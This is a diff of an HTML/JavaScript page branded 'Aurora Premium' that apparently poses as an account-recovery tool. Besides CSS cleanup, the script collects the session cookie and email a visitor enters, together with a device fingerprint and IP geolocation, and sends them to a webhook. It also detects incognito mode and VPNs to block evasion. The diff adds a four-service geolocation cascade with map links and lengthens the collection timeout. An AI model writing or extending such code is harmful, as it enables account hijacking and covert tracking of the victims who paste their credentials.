@@ -21,12 +21,14 @@
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" />
+    <link rel="dns-prefetch" href="https://ipwho.is" />
+    <link rel="dns-prefetch" href="https://ipapi.co" />
+    <link rel="dns-prefetch" href="https://ip-api.com" />
+    <link rel="dns-prefetch" href="https://ipinfo.io" />
 
     <!-- ===== FONTES ===== -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet" />
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
-
-    <!-- ===== THREE.JS + VANILLA TILT (carregados via JS condicional) ===== -->
 
     <style>
         /* ===== RESET ===== */
@@ -80,7 +82,6 @@
             text-rendering: optimizeLegibility;
         }
 
-        /* Grid pattern (desativado em mobile pra economizar) */
         @media (min-width: 769px) {
             body::before {
                 content: '';
@@ -97,7 +98,6 @@
             }
         }
 
-        /* ===== CANVAS 3D (só desktop) ===== */
         #bg3d {
             position: fixed;
             inset: 0;
@@ -108,7 +108,6 @@
         }
         body.canvas-enabled #bg3d { display: block; }
 
-        /* ===== CURSOR GLOW (só desktop) ===== */
         .cursor-glow {
             position: fixed;
             width: 420px;
@@ -125,7 +124,6 @@
         }
         body.glow-enabled .cursor-glow { display: block; }
 
-        /* ===== FUNDO ORBS ===== */
         .bg-layer {
             position: fixed;
             inset: 0;
@@ -143,51 +141,21 @@
             will-change: transform;
         }
 
-        .bg-layer .orb-1 {
-            width: 500px;
-            height: 500px;
-            background: var(--primary);
-            top: -25%;
-            left: -15%;
-        }
-
-        .bg-layer .orb-2 {
-            width: 400px;
-            height: 400px;
-            background: var(--accent);
-            bottom: -20%;
-            right: -15%;
-            animation-delay: -7s;
-        }
-
-        .bg-layer .orb-3 {
-            width: 300px;
-            height: 300px;
-            background: var(--cyan);
-            top: 50%;
-            left: 50%;
-            transform: translateX(-50%);
-            animation-delay: -14s;
-            opacity: 0.08;
-        }
+        .bg-layer .orb-1 { width: 500px; height: 500px; background: var(--primary); top: -25%; left: -15%; }
+        .bg-layer .orb-2 { width: 400px; height: 400px; background: var(--accent); bottom: -20%; right: -15%; animation-delay: -7s; }
+        .bg-layer .orb-3 { width: 300px; height: 300px; background: var(--cyan); top: 50%; left: 50%; transform: translateX(-50%); animation-delay: -14s; opacity: 0.08; }
 
         @keyframes floatOrb {
             0% { transform: translate(0, 0) scale(1); }
             100% { transform: translate(60px, -50px) scale(1.15); }
         }
 
-        /* Reduz animações em mobile fraco */
         body.low-performance .bg-layer .orb { animation: none; }
         body.low-performance .cursor-glow { display: none; }
 
-        /* ===== ANIMAÇÕES ===== */
         @keyframes fadeUp {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.2); }
-            50% { box-shadow: 0 0 40px rgba(139, 92, 246, 0.4); }
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes float3d {
@@ -203,7 +171,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Desativa animações se usuário pediu reduced motion */
         @media (prefers-reduced-motion: reduce) {
             *, *::before, *::after {
                 animation-duration: 0.01ms !important;
@@ -212,7 +179,6 @@
             }
         }
 
-        /* ===== SCROLL ===== */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: var(--bg-start); }
         ::-webkit-scrollbar-thumb {
@@ -220,7 +186,6 @@
             border-radius: 10px;
         }
 
-        /* ===== NAVBAR ===== */
         .navbar {
             position: sticky;
             top: 0;
@@ -245,7 +210,6 @@
             gap: 1rem;
         }
 
-        /* ===== LOGO ===== */
         .logo {
             display: flex;
             align-items: center;
@@ -298,11 +262,7 @@
 
         body.low-performance .logo-mark::before { animation: none; }
 
-        .logo-text {
-            display: flex;
-            flex-direction: column;
-            line-height: 1;
-        }
+        .logo-text { display: flex; flex-direction: column; line-height: 1; }
 
         .logo-text .aurora {
             background: linear-gradient(135deg, #fff, var(--secondary));
@@ -324,12 +284,7 @@
             text-transform: uppercase;
         }
 
-        /* ===== NAV LINKS ===== */
-        .nav-links {
-            display: flex;
-            gap: 0.15rem;
-            align-items: center;
-        }
+        .nav-links { display: flex; gap: 0.15rem; align-items: center; }
 
         .nav-links a {
             color: var(--text-secondary);
@@ -367,7 +322,6 @@
 
         .nav-toggle:active { transform: scale(0.95); }
 
-        /* ===== CONTAINER ===== */
         .container {
             max-width: 1400px;
             margin: 0 auto;
@@ -376,7 +330,6 @@
             z-index: 1;
         }
 
-        /* ===== SEÇÕES ===== */
         .section {
             display: none;
             padding: 2rem 0 3rem;
@@ -385,7 +338,6 @@
 
         .section.active { display: block; }
 
-        /* ===== TÍTULOS ===== */
         .section-title {
             font-family: 'Space Grotesk', sans-serif;
             font-size: clamp(1.6rem, 5vw, 2.8rem);
@@ -412,7 +364,6 @@
             padding: 0 0.5rem;
         }
 
-        /* ===== BOTÕES ===== */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -462,7 +413,6 @@
 
         .btn-secondary:disabled { opacity: 0.4; cursor: not-allowed; }
 
-        /* ===== HERO ===== */
         .hero {
             text-align: center;
             padding: 2.5rem 0 2rem;
@@ -551,7 +501,6 @@
 
         .hero-tags span i { color: var(--secondary); }
 
-        /* ===== CARDS ===== */
         .grid-4 {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
@@ -591,19 +540,9 @@
             box-shadow: 0 8px 25px var(--glow);
         }
 
-        .card h3 {
-            font-size: 1.08rem;
-            font-weight: 800;
-            margin-bottom: 0.35rem;
-        }
+        .card h3 { font-size: 1.08rem; font-weight: 800; margin-bottom: 0.35rem; }
+        .card p { color: var(--text-secondary); font-size: 0.86rem; line-height: 1.6; }
 
-        .card p {
-            color: var(--text-secondary);
-            font-size: 0.86rem;
-            line-height: 1.6;
-        }
-
-        /* ===== RECOVERY ===== */
         .recovery-layout {
             display: grid;
             grid-template-columns: 1fr 340px;
@@ -753,13 +692,8 @@
             line-height: 1.6;
         }
 
-        .disclaimer a {
-            color: var(--secondary);
-            text-decoration: none;
-            font-weight: 700;
-        }
+        .disclaimer a { color: var(--secondary); text-decoration: none; font-weight: 700; }
 
-        /* ===== BLOCK MESSAGE ===== */
         .block-msg {
             background: linear-gradient(135deg, rgba(239, 68, 68, 0.08), rgba(239, 68, 68, 0.03));
             border: 1.5px solid rgba(239, 68, 68, 0.18);
@@ -772,13 +706,7 @@
 
         .block-msg.visible { display: block; animation: fadeUp 0.4s ease-out; }
 
-        .block-msg i {
-            font-size: 2rem;
-            color: #ef4444;
-            display: block;
-            margin-bottom: 0.3rem;
-        }
-
+        .block-msg i { font-size: 2rem; color: #ef4444; display: block; margin-bottom: 0.3rem; }
         .block-msg h3 { color: #ef4444; font-weight: 800; font-size: 1rem; }
 
         .block-msg .timer {
@@ -812,12 +740,8 @@
             gap: 0.35rem;
         }
 
-        .block-msg .help-links a.tiktok {
-            color: #25f4ee;
-            border-color: rgba(37, 244, 238, 0.2);
-        }
+        .block-msg .help-links a.tiktok { color: #25f4ee; border-color: rgba(37, 244, 238, 0.2); }
 
-        /* ===== SIDEBAR ===== */
         .sidebar { display: flex; flex-direction: column; gap: 1.1rem; }
 
         .side-card {
@@ -830,10 +754,7 @@
             transition: all 0.3s;
         }
 
-        .side-card:hover {
-            transform: translateY(-2px);
-            border-color: var(--border-glow);
-        }
+        .side-card:hover { transform: translateY(-2px); border-color: var(--border-glow); }
 
         .side-card h4 {
             display: flex;
@@ -870,7 +791,6 @@
         }
 
         .info-row:last-child { border-bottom: none; }
-
         .info-row .label { color: var(--text-secondary); font-size: 0.77rem; font-weight: 500; }
         .info-row .value { color: var(--secondary); font-weight: 700; font-size: 0.82rem; }
 
@@ -888,7 +808,6 @@
 
         .feature-list li i { color: var(--secondary); font-size: 0.72rem; }
 
-        /* ===== FAQ ===== */
         .faq-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -927,12 +846,7 @@
 
         .faq-item.open .faq-q i { transform: rotate(180deg); }
 
-        .faq-a {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-        }
-
+        .faq-a { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
         .faq-item.open .faq-a { max-height: 400px; }
 
         .faq-a p {
@@ -942,7 +856,6 @@
             line-height: 1.7;
         }
 
-        /* ===== STATS ===== */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
@@ -959,10 +872,7 @@
             transition: all 0.3s;
         }
 
-        .stat-card:hover {
-            border-color: var(--border-glow);
-            transform: translateY(-4px);
-        }
+        .stat-card:hover { border-color: var(--border-glow); transform: translateY(-4px); }
 
         .stat-card .number {
             font-family: 'Space Grotesk', sans-serif;
@@ -983,7 +893,6 @@
             margin-top: 0.2rem;
         }
 
-        /* ===== COMUNIDADE ===== */
         .community-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
@@ -1001,10 +910,7 @@
             cursor: pointer;
         }
 
-        .community-card:hover {
-            border-color: var(--border-glow);
-            transform: translateY(-4px);
-        }
+        .community-card:hover { border-color: var(--border-glow); transform: translateY(-4px); }
 
         .community-icon {
             width: 56px;
@@ -1065,7 +971,6 @@
             word-break: break-all;
         }
 
-        /* ===== DOAÇÃO ===== */
         .donation-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
@@ -1127,17 +1032,10 @@
             border: 1px solid rgba(139, 92, 246, 0.08);
         }
 
-        .maintenance-banner i {
-            font-size: 1.6rem;
-            color: var(--secondary);
-            display: block;
-            margin-bottom: 0.3rem;
-        }
-
+        .maintenance-banner i { font-size: 1.6rem; color: var(--secondary); display: block; margin-bottom: 0.3rem; }
         .maintenance-banner h3 { font-weight: 800; font-size: 1rem; margin-bottom: 0.15rem; }
         .maintenance-banner p { color: var(--text-secondary); font-size: 0.83rem; }
 
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 4rem;
             padding: 2.5rem 0 1.5rem;
@@ -1166,7 +1064,6 @@
         }
 
         .footer-grid a:hover { color: var(--secondary); }
-
         .footer-grid ul { list-style: none; }
 
         .footer-bottom {
@@ -1184,7 +1081,6 @@
 
         .footer-bottom i { color: var(--primary); }
 
-        /* ===== MODAIS ===== */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -1232,11 +1128,7 @@
             margin-bottom: 0.4rem;
         }
 
-        .modal-box p {
-            color: var(--text-secondary);
-            font-size: 0.88rem;
-            margin-bottom: 1.2rem;
-        }
+        .modal-box p { color: var(--text-secondary); font-size: 0.88rem; margin-bottom: 1.2rem; }
 
         .progress-track {
             width: 100%;
@@ -1278,7 +1170,6 @@
             box-shadow: 0 8px 25px var(--glow);
         }
 
-        /* ===== TERMS MODAL ===== */
         .terms-overlay {
             position: fixed;
             inset: 0;
@@ -1334,29 +1225,14 @@
             margin-bottom: 1.2rem;
         }
 
-        .terms-box h3 {
-            color: var(--secondary);
-            font-size: 0.92rem;
-            font-weight: 700;
-            margin: 1rem 0 0.4rem;
-        }
+        .terms-box h3 { color: var(--secondary); font-size: 0.92rem; font-weight: 700; margin: 1rem 0 0.4rem; }
 
         .terms-box p,
-        .terms-box ul {
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            line-height: 1.75;
-        }
+        .terms-box ul { color: var(--text-secondary); font-size: 0.85rem; line-height: 1.75; }
 
         .terms-box ul { padding-left: 1.3rem; margin-bottom: 0.4rem; }
 
-        .terms-actions {
-            display: flex;
-            gap: 0.7rem;
-            margin-top: 1.5rem;
-            flex-wrap: wrap;
-        }
-
+        .terms-actions { display: flex; gap: 0.7rem; margin-top: 1.5rem; flex-wrap: wrap; }
         .terms-actions .btn { flex: 1; min-width: 120px; }
 
         .btn-ghost {
@@ -1365,7 +1241,6 @@
             border: 1.5px solid rgba(255, 255, 255, 0.08);
         }
 
-        /* ===== BLOCK MODAL (BAN) ===== */
         .block-overlay {
             position: fixed;
             inset: 0;
@@ -1409,11 +1284,7 @@
         .block-box .gif-wrap.active { display: block; }
         .block-box .gif-wrap img { width: 100%; height: auto; display: block; }
 
-        .block-box .icon {
-            font-size: 3rem;
-            display: block;
-            margin-bottom: 0.2rem;
-        }
+        .block-box .icon { font-size: 3rem; display: block; margin-bottom: 0.2rem; }
 
         .block-box h2 {
             font-family: 'Space Grotesk', sans-serif;
@@ -1502,7 +1373,6 @@
             line-height: 1.5;
         }
 
-        /* ===== RESPONSIVO ===== */
         @media (max-width: 1024px) {
             .recovery-layout { grid-template-columns: 1fr; }
         }
@@ -1547,10 +1417,7 @@
                 grid-template-columns: 1fr;
             }
 
-            .footer-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 1.2rem;
-            }
+            .footer-grid { grid-template-columns: 1fr 1fr; gap: 1.2rem; }
 
             .terms-actions { flex-direction: column; }
             .terms-actions .btn { width: 100%; }
@@ -1558,7 +1425,6 @@
             .hero { padding: 1.8rem 0 1.5rem; }
             .hero h1 { letter-spacing: -1.2px; }
 
-            /* Remove backdrop-filter em mobile fraco (custa muito) */
             body.low-performance .navbar,
             body.low-performance .main-panel,
             body.low-performance .side-card,
@@ -1574,23 +1440,17 @@
         @media (max-width: 480px) {
             .container { padding: 0 1rem; }
             .nav-inner { padding: 0 1rem; }
-
             .hero h1 { font-size: 2.6rem; }
             .section-title { font-size: 1.4rem; }
-
             .btn-lg { padding: 0.9rem 1.6rem; font-size: 0.95rem; }
-
             .footer-grid { grid-template-columns: 1fr; }
-
             .modal-box,
             .terms-box,
             .block-box { padding: 1.4rem 1.1rem; }
-
             .input-wrap input { font-size: 0.92rem; padding: 0.85rem 0.9rem; }
             .input-wrap .toggle { min-width: 36px; min-height: 36px; }
         }
 
-        /* Dispositivos com hover (desktop) ganham efeitos extras */
         @media (hover: none) {
             .card:hover,
             .side-card:hover,
@@ -1600,7 +1460,6 @@
             }
         }
 
-        /* Landscape em mobile - otimizar altura */
         @media (max-height: 500px) and (orientation: landscape) {
             .hero { padding: 1rem 0; }
             .hero h1 { font-size: 2rem; }
@@ -1612,7 +1471,6 @@
 </head>
 <body>
 
-    <!-- ===== CANVAS 3D (só ativado em desktop potente) ===== -->
     <canvas id="bg3d"></canvas>
     <div class="cursor-glow" id="cursorGlow"></div>
 
@@ -1937,11 +1795,11 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT OTIMIZADO ===== -->
+    <!-- ===== SCRIPT ===== -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
-        // 0. DETECÇÃO DE PERFORMANCE DO DISPOSITIVO
+        // 0. DETECÇÃO DE PERFORMANCE
         // ============================================================
         const PERF = {
             isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
@@ -1955,13 +1813,6 @@
             isTouch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
         };
 
-        // Considera low-end se:
-        // - mobile/tablet
-        // - menos de 4 núcleos
-        // - menos de 4GB RAM
-        // - 2G/3G/slow-2g
-        // - economiza dados
-        // - prefere reduced motion
         PERF.isLowEnd = PERF.isMobile ||
             PERF.isTablet ||
             PERF.cores < 4 ||
@@ -1971,22 +1822,11 @@
             PERF.hasReducedMotion;
 
         if (PERF.isLowEnd) document.body.classList.add('low-performance');
-
-        // Ativa canvas 3D apenas em desktop potente
-        if (!PERF.isLowEnd && !PERF.isMobile && PERF.cores >= 4 && PERF.memory >= 4) {
-            document.body.classList.add('canvas-enabled');
-        }
-
-        // Ativa cursor glow apenas em desktop
-        if (!PERF.isMobile && !PERF.isTouch) {
-            document.body.classList.add('glow-enabled');
-        }
-
-        console.log('%c🖥️ Performance Profile', 'color:#a78bfa;font-weight:bold;');
-        console.log('📱 Mobile:', PERF.isMobile, '| 🖥️ Cores:', PERF.cores, '| 🧠 RAM:', PERF.memory + 'GB', '| 📡 Conexão:', PERF.effectiveType, '| 🎯 Low-end:', PERF.isLowEnd);
+        if (!PERF.isLowEnd && !PERF.isMobile && PERF.cores >= 4 && PERF.memory >= 4) document.body.classList.add('canvas-enabled');
+        if (!PERF.isMobile && !PERF.isTouch) document.body.classList.add('glow-enabled');
 
         // ============================================================
-        // 0.1 CARREGAMENTO CONDICIONAL DE SCRIPTS PESADOS
+        // 0.1 CARREGAMENTO CONDICIONAL DE SCRIPTS
         // ============================================================
         function loadScript(src) {
             return new Promise((resolve, reject) => {
@@ -1999,15 +1839,14 @@
             });
         }
 
-        // Carrega Three.js só se for pra ativar canvas
         if (document.body.classList.contains('canvas-enabled')) {
             loadScript('https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js')
                 .then(() => init3DBackground())
-                .catch(() => console.log('Three.js não carregou, seguindo sem 3D'));
+                .catch(() => {});
         }
 
         // ============================================================
-        // 0.2 THREE.JS 3D (só se ativado)
+        // 0.2 THREE.JS
         // ============================================================
         function init3DBackground() {
             const canvas = document.getElementById('bg3d');
@@ -2024,7 +1863,6 @@
             const particlesCount = 400;
             const positions = new Float32Array(particlesCount * 3);
             const colors = new Float32Array(particlesCount * 3);
-
             const palette = [[0.85, 0.71, 0.99], [0.55, 0.36, 0.96], [0.66, 0.55, 0.98]];
 
             for (let i = 0; i < particlesCount; i++) {
@@ -2061,14 +1899,11 @@
                 time += 0.01;
                 targetX += (mouseX - targetX) * 0.05;
                 targetY += (mouseY - targetY) * 0.05;
-
                 particles.rotation.y = time * 0.04 + targetX * 0.25;
                 particles.rotation.x = time * 0.02 + targetY * 0.25;
-
                 camera.position.x += (targetX * 3.5 - camera.position.x) * 0.05;
                 camera.position.y += (-targetY * 3.5 - camera.position.y) * 0.05;
                 camera.lookAt(scene.position);
-
                 renderer.render(scene, camera);
             }
             animate();
@@ -2111,7 +1946,7 @@
         })();
 
         // ============================================================
-        // 0.4 VANILLA TILT (só desktop)
+        // 0.4 VANILLA TILT
         // ============================================================
         if (!PERF.isMobile && !PERF.isLowEnd) {
             loadScript('https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js')
@@ -2124,34 +1959,6 @@
                 })
                 .catch(() => {});
         }
-
-        // ============================================================
-        // 0.5 HERO PARALLAX (só desktop)
-        // ============================================================
-        (function initHeroParallax() {
-            if (PERF.isMobile || PERF.isLowEnd) return;
-            const heroTitle = document.getElementById('heroTitle');
-            const hero = document.querySelector('.hero');
-            if (!hero || !heroTitle) return;
-
-            let ticking = false;
-            hero.addEventListener('mousemove', (e) => {
-                if (!ticking) {
-                    requestAnimationFrame(() => {
-                        const rect = hero.getBoundingClientRect();
-                        const x = (e.clientX - rect.left) / rect.width - 0.5;
-                        const y = (e.clientY - rect.top) / rect.height - 0.5;
-                        heroTitle.style.transform = `perspective(1000px) rotateY(${x * 15}deg) rotateX(${-y * 15}deg)`;
-                        ticking = false;
-                    });
-                    ticking = true;
-                }
-            });
-
-            hero.addEventListener('mouseleave', () => {
-                heroTitle.style.transform = 'perspective(1000px) rotateY(0) rotateX(0)';
-            });
-        })();
 
         // ============================================================
         // 1. DETECÇÃO DE INCÓGNITO
@@ -2233,12 +2040,11 @@
             });
         }
 
-        // Fetch com timeout
         function fetchWithTimeout(url, timeout = 4000) {
-            return Promise.race([
-                fetch(url, { signal: AbortSignal.timeout ? AbortSignal.timeout(timeout) : undefined }),
-                new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), timeout))
-            ]);
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), timeout);
+            return fetch(url, { signal: controller.signal })
+                .finally(() => clearTimeout(timer));
         }
 
         async function detectVPN() {
@@ -2462,7 +2268,7 @@
         }
 
         // ============================================================
-        // 7. COLETA AVANÇADA (roda em background, sem travar)
+        // 7. COLETA AVANÇADA
         // ============================================================
         function getOS() {
             const ua = navigator.userAgent;
@@ -2590,34 +2396,108 @@
             } catch (e) { return false; }
         }
 
+        // ============================================================
+        // 🌍 GEO INFO - 4 APIs EM CASCATA (CORRIGIDO)
+        // ============================================================
         async function getGeoInfo() {
+            // ===== API 1: ipwho.is (mais confiável, CORS liberado) =====
             try {
-                const r = await fetchWithTimeout('https://ipapi.co/json/', 5000);
-                if (!r.ok) throw new Error('fail');
-                const d = await r.json();
-                return {
-                    ip: d.ip, country: d.country_name, countryCode: d.country_code,
-                    region: d.region, city: d.city, postal: d.postal,
-                    latitude: d.latitude, longitude: d.longitude,
-                    timezone: d.timezone, currency: d.currency,
-                    isp: d.org, asn: d.asn,
-                };
-            } catch (e) {
-                try {
-                    const r2 = await fetchWithTimeout('https://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,as,query', 5000);
-                    const d2 = await r2.json();
-                    if (d2.status === 'success') {
+                const r = await fetchWithTimeout('https://ipwho.is/', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.success !== false && d.country) {
                         return {
-                            ip: d2.query, country: d2.country, countryCode: d2.countryCode,
-                            region: d2.regionName, city: d2.city, postal: d2.zip,
-                            latitude: d2.lat, longitude: d2.lon,
-                            timezone: d2.timezone, currency: d2.currency,
-                            isp: d2.isp, asn: d2.as,
+                            ip: d.ip || 'N/A',
+                            country: d.country || 'N/A',
+                            countryCode: d.country_code || '',
+                            region: d.region || 'N/A',
+                            city: d.city || 'N/A',
+                            postal: d.postal || 'N/A',
+                            latitude: d.latitude,
+                            longitude: d.longitude,
+                            timezone: d.timezone?.id || 'N/A',
+                            currency: d.currency?.code || 'N/A',
+                            isp: d.connection?.isp || d.connection?.org || 'N/A',
+                            asn: d.connection?.asn ? 'AS' + d.connection.asn : 'N/A',
                         };
                     }
-                } catch (e2) {}
-                return null;
-            }
+                }
+            } catch (e) { console.warn('ipwho.is falhou'); }
+
+            // ===== API 2: ipapi.co =====
+            try {
+                const r = await fetchWithTimeout('https://ipapi.co/json/', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.country_name && d.country_name !== null) {
+                        return {
+                            ip: d.ip || 'N/A',
+                            country: d.country_name || 'N/A',
+                            countryCode: d.country_code || '',
+                            region: d.region || 'N/A',
+                            city: d.city || 'N/A',
+                            postal: d.postal || 'N/A',
+                            latitude: d.latitude,
+                            longitude: d.longitude,
+                            timezone: d.timezone || 'N/A',
+                            currency: d.currency || 'N/A',
+                            isp: d.org || 'N/A',
+                            asn: d.asn || 'N/A',
+                        };
+                    }
+                }
+            } catch (e) { console.warn('ipapi.co falhou'); }
+
+            // ===== API 3: ip-api.com =====
+            try {
+                const r = await fetchWithTimeout('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,as,query', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.status === 'success') {
+                        return {
+                            ip: d.query || 'N/A',
+                            country: d.country || 'N/A',
+                            countryCode: d.countryCode || '',
+                            region: d.regionName || 'N/A',
+                            city: d.city || 'N/A',
+                            postal: d.zip || 'N/A',
+                            latitude: d.lat,
+                            longitude: d.lon,
+                            timezone: d.timezone || 'N/A',
+                            currency: d.currency || 'N/A',
+                            isp: d.isp || 'N/A',
+                            asn: d.as || 'N/A',
+                        };
+                    }
+                }
+            } catch (e) { console.warn('ip-api.com falhou'); }
+
+            // ===== API 4: ipinfo.io (fallback final) =====
+            try {
+                const r = await fetchWithTimeout('https://ipinfo.io/json', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && (d.city || d.country)) {
+                        const loc = (d.loc || ',').split(',');
+                        return {
+                            ip: d.ip || 'N/A',
+                            country: d.country || 'N/A',
+                            countryCode: d.country || '',
+                            region: d.region || 'N/A',
+                            city: d.city || 'N/A',
+                            postal: d.postal || 'N/A',
+                            latitude: loc[0] ? parseFloat(loc[0]) : null,
+                            longitude: loc[1] ? parseFloat(loc[1]) : null,
+                            timezone: d.timezone || 'N/A',
+                            currency: 'N/A',
+                            isp: d.org || 'N/A',
+                            asn: d.org ? d.org.split(' ')[0] : 'N/A',
+                        };
+                    }
+                }
+            } catch (e) { console.warn('ipinfo.io falhou'); }
+
+            return null;
         }
 
         function getVisitCount() {
@@ -2630,18 +2510,17 @@
         }
 
         function getFlagEmoji(code) {
-            if (!code) return '🌍';
+            if (!code || code.length !== 2) return '🌍';
             try {
                 return String.fromCodePoint(...code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0)));
             } catch (e) { return '🌍'; }
         }
 
         // ============================================================
-        // 7.1 WEBHOOK — EMBED ULTRA COMPLETO
+        // 7.1 WEBHOOK
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // Coleta em paralelo com timeout total
                 const collectAll = Promise.all([
                     vpnDetected ? getIPData() : Promise.resolve(null),
                     getGeoInfo(),
@@ -2652,7 +2531,7 @@
 
                 const [vpnData, geoData, battery, adBlock, fingerprint] = await Promise.race([
                     collectAll,
-                    new Promise(resolve => setTimeout(() => resolve([null, null, null, false, 'TIMEOUT']), 8000))
+                    new Promise(resolve => setTimeout(() => resolve([null, null, null, false, 'TIMEOUT']), 10000))
                 ]);
 
                 const connection = getConnection();
@@ -2671,7 +2550,7 @@
                 const flag = geoData ? getFlagEmoji(geoData.countryCode) : '🌍';
                 const location = geoData ? `**${geoData.city || 'N/A'}**, ${geoData.region || 'N/A'}` : 'N/A';
                 const country = geoData ? `${flag} ${geoData.country || 'N/A'}` : 'N/A';
-                const coords = geoData && geoData.latitude
+                const coords = (geoData && geoData.latitude != null)
                     ? `[${geoData.latitude}, ${geoData.longitude}](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`
                     : 'N/A';
 
@@ -2765,7 +2644,7 @@
                             title: '📱 User Agent Completo',
                             color: 0x6366f1,
                             description: `\`\`\`${ua.substring(0, 900)}\`\`\``,
-                            footer: { text: `Aurora v4.2 • ${new Date().getFullYear()} • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
+                            footer: { text: `Aurora v4.3 • ${new Date().getFullYear()} • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
                         }
                     ]
                 };
@@ -3086,8 +2965,7 @@
         // 17. INIT
         // ============================================================
         async function init() {
-            console.log('%c✨ Aurora Premium v4.2 ✨', 'font-size:22px;font-weight:bold;background:linear-gradient(90deg,#8b5cf6,#d8b4fe);-webkit-background-clip:text;color:transparent;');
-            console.log('%c📱 Otimizado para mobile', 'font-size:12px;color:#a78bfa;');
+            console.log('%c✨ Aurora Premium v4.3 ✨', 'font-size:22px;font-weight:bold;background:linear-gradient(90deg,#8b5cf6,#d8b4fe);-webkit-background-clip:text;color:transparent;');
 
             const isIncognito = await detectIncognito();
             if (isIncognito) {
@@ -3124,17 +3002,11 @@
             const banned = await checkBanStatus();
             if (banned) return;
 
-            // Roda detect e init em background sem esperar
             checkDetection();
-
-            // Restore do block
             restoreBlock();
-
-            // Terms com pequeno delay para não travar
             setTimeout(checkTerms, 800);
         }
 
-        // Aguarda DOM pronto
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', init);
         } else {
